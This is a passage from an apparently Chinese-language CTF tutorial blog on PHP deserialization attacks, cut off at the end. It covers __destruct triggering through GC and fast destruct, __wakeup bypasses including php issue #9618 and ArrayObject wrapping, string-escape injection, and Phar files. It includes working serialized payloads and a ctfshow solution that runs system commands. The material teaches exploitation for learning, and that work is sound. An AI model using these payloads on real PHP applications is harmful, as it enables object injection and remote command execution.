invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里因为有异常处理，所以正常情况下是无法<code>__destruct</code>，这时我们就需要利用GC回收机制来触发<code>__destruct</code>。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="keyword">new</span> B,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;b&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>得到序列化文本如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;b&quot;;N;&#125;</span><br><span class="line">对象类型:对象个数:&#123;类型:长度:键名;类型:长度:类名:值类型:长度:键名;类型;&#125;</span><br><span class="line">数组:对象个数为2:&#123;str型:长度1:键名为&quot;a&quot;;类:长度为1:类名为&quot;B&quot;:值为0 str型:值为1:键名为&quot;b&quot;:NULL型;&#125;</span><br></pre></td></tr></table></figure><p>这时我们将键名<code>b</code>改成<code>a</code>，即在反序列化时，会下先让<code>a</code>赋值为类<code>B</code>，之后再将<code>a</code>赋值为<code>NULL</code>，但一开始<code>a</code>已经是对象了，赋值为<code>NULL</code>时就会出现对象为<code>NULL</code>的情况，从而触发<code>__destruct</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;a&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_3_5.png"></p><p>这个是在反序列化中经常使用的方法。</p><h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h2><p>知识点：</p><p><em>1、PHP中，如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</em></p><p><em>2、PHP中，如果用一个变量接住反序列化函数的返回值，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，那么在PHP脚本走完流程之后，这个对象才会被销毁，在有析构函数的情况下就会将其执行。</em></p><p>fast destruct 就是用来解决第二种情况带来的问题的。</p><p><strong>解法一</strong></p><p>当需要构造pop链的时候，反序列化后的对象被变量接住了，又要利用析构函数控制POP链的流程，这个时候就需要用到快速析构的技巧。</p><p>而且，大部分都是在类和类之间各有分工，在内部联系不是很紧密的情况下使用这种技巧。</p><p>使用索引相同的两个类，后一个类被反序列化时，前一个类会被销毁，从而调用析构函数（如果有的话）。</p><p>举例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="keyword">array</span>(<span class="number">0</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class1</span>(),<span class="number">1</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class2</span>(),<span class="number">2</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class3</span>(),<span class="number">1</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class4</span>(),<span class="number">2</span> =&gt; <span class="keyword">new</span> <span class="title function_ invoke__">class5</span>()));</span><br><span class="line"><span class="variable">$target</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$unser</span>);</span><br></pre></td></tr></table></figure><p>那么整个流程如下:</p><p><em>class1被反序列化</em></p><p><em>class2被反序列化</em></p><p><em>class3被反序列化</em></p><p><em>class4被反序列化，class2被销毁</em></p><p><em>class5被反序列化，class3被销毁</em></p><p>注意，使用这种技巧得到的数组序列化字符串，其元素值必须依然是括号内元素的个数，只是对应的key要改一下。</p><p>“后一个类” 可以是一个无用的对象，包括数组。</p><p>其实就是一种GC回收机制。</p><p><strong>解法二</strong></p><p>在<code>unserialize</code>过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的<code>__destruct()</code>,提前触发反序列化链条。</p><p>这种情况只需要破坏原先的字符串格式即可，比如去掉最后的大括号，。</p><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:0:&#123;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_4_1.png"></p><h2 id="php-issue-9618"><a href="#php-issue-9618" class="headerlink" title="php issue#9618"></a>php issue#9618</h2><p><a href="https://github.com/php/php-src/issues/9618">php issue#9618</a>提到了最新版wakeup()的一种bug，可以通过在反序列化后的字符串中包含字符串长度错误的变量名使反序列化在__wakeup之前调用__destruct()函数，最后绕过__wakeup()，版本：</p><ul><li>7.4.x -7.4.30</li><li>8.0.x</li></ul><p>样例（php 8.0.2）:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$end</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;info-&gt;<span class="title function_ invoke__">func</span>();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$znd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;znd = <span class="string">&quot;exit();&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__call &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$end</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;info-&gt;<span class="title function_ invoke__">func</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$znd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;znd = <span class="string">&quot;exit();&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__call &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;info=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;znd&quot;;N;&#125;s:6:&quot;Aend&quot;;s:1:&quot;1&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_5_1.png"></p><p>很显然，<code>wakeup</code>在最后触发。</p><h2 id="使用C绕过"><a href="#使用C绕过" class="headerlink" title="使用C绕过"></a>使用C绕过</h2><p>众所周知可以使用C进行绕过wakeup，但这样有一个缺点，就是你把O改为C后是没办法有属性的，那假如需要用属性命令执行就不行了。</p><p>新方法是用原生类把原本的类打包一下，生成以C开头的payload。</p><p>这也是绕过<code>/^[Oa]:[/d]+/</code>过滤的方法之一。</p><p>样例（ctfshow 愚人杯3rd [easy_php]）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[/d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// C:11:&quot;ArrayObject&quot;:60:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>实现了unserialize接口类的大概率是C打头，列出一些以C开头的原生类：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplDoublyLinkedList::unserialize</span><br><span class="line">SplQueue::unserialize</span><br><span class="line">SplStack::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure><p>需要注意，这种方法在序列化时对php版本有要求，用7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，但在<code>unserialize</code>时对php版本没要求。</p><h1 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h1><p>当 PHP 中序列化后的数据进行了长度替换之后，就可能存在这一漏洞，即通过修改输入数据从而控制整个序列化的内容。</p><p>反序列化知识：</p><ul><li>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾（字符串除外）并且是根据长度判断内容的<ul><li>注意点，很容易以为序列化后的字符串是<code>;&#125;</code>结尾，实际上字符串序列化是以<code>;&#125;</code>结尾的，但对象序列化是直接<code>&#125;</code>结尾</li><li>php反序列化字符逃逸，就是通过这个结尾符实现的</li></ul></li><li>当长度不对应的时候会出现报错</li><li>反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行</li></ul><h2 id="字符变多"><a href="#字符变多" class="headerlink" title="字符变多"></a>字符变多</h2><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;test1 = <span class="variable">$test1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;test2===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you get it!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test1&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;yy&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>问：如果我能控制进行反序列化的字符串，该如何使<code>$test2</code>的值是<code>admin</code>而不是<code>hacker</code>？</p><p>假如传入的<code>test1</code>是<code>xxx123</code>：</p><ul><li>正常情况下序列化后的字符串为<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx123&quot;;s:5:&quot;test2&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>经过替换后，变成<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;yyyyyy123&quot;;s:5:&quot;test2&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>反序列化时，读取<code>yyyyyy</code>后，发现没有闭合符号，因此反序列化失败</li><li>此时发现<code>123</code>逃逸出来了，这部分是可控的。</li></ul><p>我们可以利用这可控的部分把<code>test2</code>的值改掉。</p><ul><li><p>这时候，需要先找到一个要逃逸那部分的字符串。</p></li><li><p><code>&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code>是我们需要逃逸的部分。最简单的判断方法是先本地序列化出一个我们想要的序列化字符串<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx123&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code>，然后以<code>xxx123</code>为分界线，取后边所有的字符串，这个字符串就是我们需要逃逸的部分。</p></li><li><p>之后统计出<code>&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code>的长度为27，说明我们需要逃逸27个字符。</p></li><li><p>替换函数是将<code>x</code>替换成<code>yy</code>，多出1个字符，因此输入27个<code>x</code>，就能逃逸出27个字符。</p></li><li><p>因此<code>test1</code>的值为<code>xxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code></p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%80%83%E9%80%B8_1_1.png"></p></li></ul><h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><p>样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test3</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test1</span>,<span class="variable">$test2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;test1 = <span class="variable">$test1</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;test2 = <span class="variable">$test2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;test3===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you get it!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test1&#x27;</span>];</span><br><span class="line"><span class="variable">$test2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test2&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$test1</span>,<span class="variable">$test2</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;xx&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>问：如果我能控制进行反序列化的字符串，该如何使<code>$test3</code>的值是<code>admin</code>而不是<code>hacker</code>？</p><p>假如传入的<code>test1</code>是<code>xxxxxx</code>，<code>test2</code>是<code>abc</code>：</p><ul><li>正常情况下序列化后的字符串为<code>O:1:&quot;A&quot;:3:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>经过替换后，变成<code>O:1:&quot;A&quot;:3:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>反序列化时，读取<code>xxx&quot;;s</code>(长度为6)后，发现没有闭合符号，因此反序列化失败。</li><li>此时发现<code>&quot;;s</code>被吸收进<code>test1</code>里了，这部分是可控的，可以控制吸收多少个字符。</li></ul><p>我们可以利用这可控的部分把一些不需要的值吸收进去，再通过控制第二个变量，构造出我们想要的东西。</p><ul><li><p>需要先找到一个要逃逸那部分的字符串</p></li><li><p>方法和<code>字符变多</code>一样，先本地序列化出一个我们想要的序列化字符串<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx123&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:5:&quot;admin&quot;;&#125;</code>，然后以<code>xxx123</code>为分界线，取后边所有的字符串，这个字符串就是我们需要逃逸的部分。</p></li><li><p><code>&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:5:&quot;admin&quot;;&#125;</code>是需要逃逸的部分。</p></li><li><p>接下来找需要吸收的部分，我们需要把<code>&quot;;s:5:&quot;test2&quot;;s:3:&quot;</code>吸收进来，这里的<code>:3:</code>不是固定的，<code>3</code>是上面逃逸部分的长度（49）。（这个不是重点）</p></li><li><p>此时我们需要把<code>&quot;;s:5:&quot;test2&quot;;s:49:&quot;</code>吸收进来，让原本<code>test2</code>的值成为反序列化字符串的合法部分。</p></li><li><p>统计出<code>&quot;;s:5:&quot;test2&quot;;s:49:&quot;</code>的长度为20，说明我们需要吸收20个字符。</p></li><li><p>替换函数是将<code>xx</code>替换成<code>y</code>，减少1个字符，因此输入40个<code>x</code>，就能吸收20个字符。</p></li><li><p>因此传入<code>test1</code>的值为<code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code>，<code>test2</code>的值为<code>&quot;;s:5:&quot;test2&quot;;N;s:5:&quot;test3&quot;;s:5:&quot;admin&quot;;&#125;</code></p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%80%83%E9%80%B8_2_1.png"></p></li></ul><h1 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h1><p>Phar文件是php里类似于JAR的一种打包文件本质上是一种压缩文件，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.a stub</span><br><span class="line">    可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件</span><br><span class="line">2.a manifest describing the contents</span><br><span class="line">phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方</span><br><span class="line">3.the file contents</span><br><span class="line">被压缩文件的内容</span><br><span class="line">4.[optional] a signature for verifying Phar integrity (phar file format only)</span><br><span class="line">签名，放在文件末尾</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>生成phar文件</strong></p><p>php内置了一个Phar类来处理相关操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span 